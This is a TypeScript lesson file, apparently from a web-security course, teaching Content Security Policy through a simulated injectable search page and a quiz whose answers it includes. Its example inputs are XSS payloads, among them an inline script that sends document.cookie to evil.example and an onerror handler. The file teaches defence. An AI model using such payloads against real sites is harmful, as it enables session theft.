import { contentSecurityPolicyCode, contentSecurityPolicySteps, POLICY_OPTIONS } from '../../security/scenarios/content-security-policy';
import type { LessonContent } from '../../types/lesson';

const [NONE, UNSAFE, NONCE] = POLICY_OPTIONS;
const INLINE = "<script>fetch('https://evil.example/c?' + document.cookie)</script>";
const OUTSIDE = '<script src=https://evil.example/x.js></script>';
const IMAGE = '<img src=x onerror=alert(1)>';
const defaults = { policy: NONE!, input: INLINE };
const pageArrived = contentSecurityPolicySteps({ policy: NONCE!, input: INLINE }).at(1)!;

const content: LessonContent = {
  overview:
    'Encoding stops script injection, but one missed spot brings it back. A Content Security Policy is a second line: a header that tells the browser which scripts a page may run. Here the shop has an injection bug on purpose, and you send the same payload past three policies.',
  concept: [
    'CSP is a response header. Each directive lists the sources allowed for one kind of content, and script-src covers scripts. If script-src is missing, default-src applies.',
    "'self' allows scripts from the page's own origin. A host allows scripts from that host. Neither allows inline code, so a policy with only those blocks every <script> with text in it and every onerror.",
    "'unsafe-inline' allows inline code back in, which is what many old pages need. It also allows the attacker's inline code, because the browser can't tell the two apart. It does stop an outside script from evil.example.",
    "A nonce is a random value, new for every response. The page's own script tag carries it, and an attacker can't guess it, because it did not exist when the payload was written. With a nonce in the policy, browsers ignore 'unsafe-inline'.",
    'Handlers such as onerror have no tag to carry a nonce, so a nonce policy blocks them as well. The page\'s own code has to attach its handlers from a script.',
    "CSP does not remove the bug. The markup is still in the page, and anything that doesn't need a script, such as a fake form, still works. In production, roll a policy out with Content-Security-Policy-Report-Only and read the reports first, prefer nonces or hashes with 'strict-dynamic' over long host lists, and never let a nonce be reused across responses.",
  ],
  howItWorks: [
    'The server sends a page with a policy in its header.',
    'The browser parses the page and finds each script.',
    'It compares each one with script-src, or default-src.',
    'An allowed script runs. A blocked one is skipped, and the browser names the rule.',
    'The rest of the page, with any injected markup, still loads.',
  ],
  visualization: {
    kind: 'form',
    fields: [
      { name: 'policy', label: 'Policy', type: 'choice', sample: defaults.policy, options: POLICY_OPTIONS, help: "None sends no header. unsafe-inline is script-src 'self' 'unsafe-inline'. Nonce is a fresh script-src 'nonce-...'." },
      { name: 'input', label: 'Input', type: 'text', sample: defaults.input, help: '1 to 120 bytes, sent to a search page with no encoding. It only ever runs in the simulation.' },
    ],
    presets: [
      { label: 'Inline with no policy', values: defaults },
      { label: 'Inline with unsafe-inline', values: { policy: UNSAFE!, input: INLINE } },
      { label: 'Outside with unsafe-inline', values: { policy: UNSAFE!, input: OUTSIDE } },
      { label: 'Handler with unsafe-inline', values: { policy: UNSAFE!, input: IMAGE } },
      { label: 'Inline with a nonce', values: { policy: NONCE!, input: INLINE } },
      { label: 'Handler with a nonce', values: { policy: NONCE!, input: IMAGE } },
    ],
    generate: contentSecurityPolicySteps,
    codeLabel: 'Pseudocode',
  },
  code: contentSecurityPolicyCode,
  prosCons: {
    pros: ['It limits the damage of a missed encoding', 'A nonce policy blocks injected inline code and handlers', 'Violations can be reported to the site'],
    cons: ['It does not remove the bug', 'Old pages with inline code are hard to move', "'unsafe-inline' and long host lists give much of it back"],
    useWhen: ['Any site with sessions, as a second line behind encoding'],
    avoidWhen: ['Using it in place of encoding', 'Reusing one nonce across responses or caching it in a page'],
  },
  applications: [
    'Blocking injected scripts on sites with sign-in',
    'Stopping a page loading scripts from unknown hosts',
    'Finding inline code through reports before enforcing a policy',
  ],
  commonMistakes: [
    "Adding 'unsafe-inline' to quiet errors, which turns off the protection against inline code.",
    'Using a fixed nonce, which an attacker can read and copy.',
    'Thinking a strong policy means the injection no longer matters.',
  ],
  quiz: [
    {
      id: 'q1',
      type: 'predict-next',
      prompt: 'The page holds an injected inline script with no nonce, under this policy. What does the browser do with it?',
      view: pageArrived.view,
      options: ['Blocks it, and runs only the script that carries the nonce', 'Runs it, because it is inline', 'Runs both scripts', 'Refuses the whole page'],
      answer: 0,
      explanation: 'A nonce policy allows only tags that carry this response\'s nonce. The injected script can\'t have it.',
    },
    {
      id: 'q2',
      type: 'multiple-choice',
      prompt: "Why doesn't 'unsafe-inline' stop an injected <script>alert(1)</script>?",
      options: ['It allows all inline code, and the browser can\'t tell whose it is', 'It only applies to images', 'Inline code is checked by the server', 'It needs a report address'],
      answer: 0,
      explanation: 'The name is a warning. It does still stop a script from another host.',
    },
    {
      id: 'q3',
      type: 'code',
      prompt: 'Which script does this policy allow?',
      code: "content-security-policy: script-src 'nonce-r4nd0m'",
      options: ['<script nonce="r4nd0m">...</script>', '<script>...</script>', '<img src=x onerror=...>', '<script src=https://evil.example/x.js></script>'],
      answer: 0,
      explanation: 'Only the tag that carries the nonce runs. Handlers and other hosts are blocked.',
    },
    {
      id: 'q4',
      type: 'multiple-choice',
      prompt: 'A strict policy blocked the payload. What is left to fix?',
      options: ['The injection: the markup is still in the page', 'Nothing: the page is safe now', 'The cookie flags on the session', 'The database'],
      answer: 0,
      explanation: 'CSP is a second line. Encoding removes the cause.',
    },
  ],
  summary: [
    'CSP tells the browser which scripts a page may run.',
    "'unsafe-inline' lets injected inline code through.",
    'A fresh nonce allows only the page\'s own tags.',
    'Handlers have no nonce, so a nonce policy blocks them.',
    'The bug is still there, so CSP is a second line.',
  ],
};

export default content;
